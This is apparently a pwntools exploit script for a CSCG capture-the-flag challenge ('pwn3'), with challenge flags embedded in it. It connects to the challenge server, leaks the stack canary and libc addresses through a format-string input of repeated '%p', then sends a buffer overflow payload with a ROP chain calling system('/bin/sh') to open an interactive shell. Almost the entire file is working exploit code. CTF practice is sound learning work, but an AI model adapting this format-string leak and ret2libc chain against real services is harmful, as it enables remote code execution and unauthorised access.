from pwn import *

HOST = 'hax1.allesctf.net'
#HOST = 'localhost'
PORT = '9102'
#PORT = '1024'

#0x0000555555554ce3

#PASSWORD = "CSCG{NOW_PRACTICE_MORE}"
#FLAG =CSCG{NOW_GET_VOLDEMORT}
PASSWORD ="CSCG{NOW_GET_VOLDEMORT}"
#PASSWORD = "CSCG{THIS_IS_TEST_FLAG}"

#FLAG = CSCG{VOLDEMORT_DID_NOTHING_WRONG}

#r = remote('localhost','9100')
p = remote(HOST,PORT)
#p = process("./pwn3")

offset___libc_start_main_ret = 0x271e3
offset_system = 0x00000000000554e0
offset_dup2 = 0x0000000000111b60
offset_read = 0x0000000000111260
offset_write = 0x0000000000111300
offset_str_bin_sh = 0x1b6613

offset_popRDI = 0x0000000000026bb2

def remoteExploit():
    r = remote(HOST,PORT)

# leak a code address from the stack and use known offsets to calculate the WIN address
def leakAddresses():
    #raw_input("Attach gdb")
    print(p.recvuntil("Enter the password of stage 2:"))
    p.sendline(PASSWORD)


    #formatStringAttack = (66-26)*"|%p|"
    formatStringAttack = (65)*"|%p|"
    p.sendlineafter('Enter your witch name:\n', formatStringAttack)
    stackDump = p.recvuntil(" enter your magic spell:\n")
    print(stackDump.decode('UTF-8'))
    #print(stackDump)
    stackDumpArray = stackDump.split(b"||")
    #print(stackDumpArray)
    #get the last element 
    mainAddr = stackDumpArray[-17]
    #print(mainAddr)

    stackCanary = stackDumpArray[-27]

    libcStartMain = stackDumpArray[-21]
    print("leaked libc start_main addr: {}".format(libcStartMain.decode()))
    #baseAddr = int(libcStartMain.decode(), 16) - 0x00020830
    baseAddr = int(libcStartMain.decode(), 16) - offset___libc_start_main_ret 
    #baseAddr = int(libcStartMain.decode(), 16) -0x18f523-0x17f7a
    print("calculated base Adr: {}".format(hex(baseAddr)))
    #execveAdr = baseAddr + 0x000cc770
    #execveAdr = baseAddr + 0x000cc770
    #print("calculated execve() Adr: {}".format(hex(execveAdr)))
    systemAdr = baseAddr + offset_system
    #systemAdr = int(libcStartMain.decode(),16) + 0x2E2FD# + 0x00045390
    print("calculated System() Adr: {}".format(hex(systemAdr)))
    binShAdr = baseAddr + offset_str_bin_sh
    #binShAdr = int(libcStartMain.decode(),16) + 0x18F430
    print("calculated Adr of /bin/sh: {}".format(hex(binShAdr)))
    #print(stackCanary)

    #calculate difference of WINgardium function and main instruction at addr mainAddr
    #this can be calculated with gdb
    print("Address of instruction in main function: {}\n".format(mainAddr.decode()))
    print("Stack canary of welcome function: {}\n".format(stackCanary.decode()))
    winAdr =  int(mainAddr.decode(),16) -0x1f3#- 0x1fa
    #winAdr =  int(mainAddr.decode(),16) - 0x1fa
    return winAdr,int(stackCanary.decode(),16),systemAdr,binShAdr,baseAddr

# use the winAdr to overwrite the return address from AAAAAAAAA()
def localExploit(winAdr,offsetSize,canary,systemAddr,binShAdr, baseAdr):
    popRdiGadget = baseAdr + offset_popRDI
    ret = winAdr+0x2a
    raw_input("wait for gdb") 
    payload = b"Expelliarmus\x00"
    payload += offsetSize*b'A'
    payload += p64(canary)

    payload += int(hex(cyclic_find("caaa")),16)*b'A'
    #payload += 8*b'B' 
    payload += p64(ret)

    payload += p64(popRdiGadget)
    payload += p64(binShAdr)
    #payload += p64(ret)
    payload += p64(systemAddr)

    payload += p64(binShAdr)

    print(payload)
    p.sendline(payload)
    print(p.recvuntil("~ Protego!\n").decode('utf-8'))
    p.interactive()

def findOffset():

    raw_input("attach gdb on pwn3")
    #c = "Expelliarmus\x00"+cyclic(0x2ff).decode()
    payload = b"Expelliarmus\x00"
    #payload += cyclic(offsetSize)
    payload += offsetSize*b'A'
    payload += p64(canary)
    payload += 8*b'B' 

    payload += cyclic(0xff).decode()
    #payload += p64(ret)
    p.sendline(c)
    #start gdb 
    #io = gdb.debug('./pwn1', '''
    #    break main
    #    continue
    #''')
    #p.recvuntil("Enter your witch name:\n")
    #send our cyclic input
    #io.sendline(c)

    #interactive to keep the process alive
    #io.interactive()

    #result:
    # "cnaa" is on top of the stack when the binary crashes -> use cyclic_find to get offset for the bufferoverflow
    return int(hex(cyclic_find("cnaa")),16)
    # so offset for the buffer overflow is 0xfb

if __name__=='__main__':
    #start gdb to get the offset for the buffer overflow
    #offset = findOffset()
    offset = int(hex(cyclic_find("cnaa")),16)

    #leakAddresses()
    winAdr,canary,systemAdr,binShAdr,baseAdr = leakAddresses()
    print("calculated WIN address: {}".format(hex(winAdr)))

    #findOffset()
    localExploit(winAdr, offset,canary,systemAdr,binShAdr,baseAdr)
